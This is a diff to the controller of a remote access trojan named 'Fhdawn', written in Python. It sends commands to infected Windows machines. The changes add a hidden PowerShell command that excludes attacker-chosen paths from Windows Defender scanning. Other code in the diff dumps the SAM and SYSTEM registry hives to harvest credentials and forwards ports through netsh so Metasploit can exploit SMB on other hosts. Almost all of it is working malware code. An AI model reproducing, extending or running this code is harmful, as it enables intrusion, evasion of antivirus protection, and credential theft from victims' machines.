@@ -21,6 +21,7 @@ log = [] # Must not exceed 1
 
 silent = False
 shellmode = False  # ( ͡° ͜ʖ ͡°)
+elevated = False
 
 class ClientManage:
     def __init__(self, client_socket):
@@ -32,7 +33,7 @@ class ClientManage:
     attack_host = [] # The host set to attack, must not exceed 1
     attack_port = [] # The port set to attack, must not exceed 1
     exploit_port = [] # The port used for exploitation, must not exceed 1
-    elevated = False
+    global elevated
 
     def Log(self, data):
         del log[:]
@@ -86,7 +87,7 @@ class ClientManage:
             # Forward port
             # Create Metasploit RC File.
             # Run the Metasploit RC File.
-            if(self.elevated):
+            if(elevated):
                 if(self.attack_port[0] == "445"):
                     cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                         lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
@@ -133,7 +134,7 @@ class ClientManage:
             else:
                 print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
         def Attack():
-            if(self.elevated):
+            if(elevated):
                 if(len(self.exploit_port) == 0):
                     self.exploit_port.append(random.randint(1000, 9000))
                 else:
@@ -230,14 +231,18 @@ class ClientManage:
             self.SendData("delete:output.png")
             self.WaitForReply()
 
-        if(session):
-            self.SendData("isadmin") # check admin first
-            self.WaitForReply()
-            time.sleep(2)
-            if(self.elevated):
-                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} with Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
-            else:
-                print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} without Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
+        # if(session):
+        #     silent = True
+        #     self.SendData("isadmin") # check admin first 
+        #     while(True):
+        #         self.WaitForReply()
+        #         silent = False
+        #         time.sleep(2)
+        #         print(str(elevated))
+        #         if(elevated):
+        #             print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} with Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
+        #         else:
+        #             print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} without Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
         while(session):
             try:
                 try:
@@ -364,9 +369,17 @@ class ClientManage:
                 elif ( main == "windefender_exclude"):
                     path = prompt("[+] Path on Remote PC ( File / Folder ) : ")
                     if(len(path) > 0):
-                        self.SendData("exclude")
-                        self.SendData(path)
-                        
+                        if(elevated == True):
+                        # self.SendData("exclude")
+                        # self.SendData(path)
+                            strs = "cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '{s}'".format(s = path)
+                            self.SendData(strs)
+                            time.sleep(3)
+                            print("[+] Exclusion added.") # Not checking it.. according to my tests, It works. 
+                            # But I should add checking
+                            # how can we check for exlcusions O_o
+                        else:
+                            print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.") 
 
                 elif ( main == "systeminfo"):
                     self.SendData("systeminfo")
@@ -656,7 +669,7 @@ Open Ports
                     print(help)
 
                 elif(main == "samdump"):
-                    if(self.elevated):
+                    if(elevated):
                         self.SendData("cmd.exe /c reg save hklm\sam sam")
                         self.WaitForReply()
                         self.SendData("cmd.exe /c reg save hklm\system system")
@@ -752,7 +765,7 @@ Open Ports
             try: 
                 if(len(log) > 0): # If length of log is greater than 0, means message received. So break the loop
                     break # break here
-                time.sleep(1) # Sleep 1 second
+                time.sleep(0.5) # Sleep 0.5 second
                 x += 1 # Add one to x
                 if(x == 20):
                     print( Style.BRIGHT + Fore.RED + "[i]" + Style.RESET_ALL + " 20 seconds have passed and we have received no response from Fhdawn. There may be a problem.")
@@ -867,13 +880,17 @@ Open Ports
                 elif(client_data.startswith("ADMIN")):
                     try:
                         fileinfo = client_data.split(":") 
-                        print(
-                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Administrator : " + fileinfo[1])
                         
                         if(fileinfo[1] == "TRUE"):
-                            self.elevated = True
+                            elevated = True
                         else:
-                            self.elevated = False
+                            elevated = False
+                            
+                        if(not silent):
+                            print(
+                                Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Administrator : " + fileinfo[1].lower())
+                        
+                        
                     except Exception as Error:
                         print("[X] Error : " + str(Error))
                         print("[i] Process Information : " + client_data)
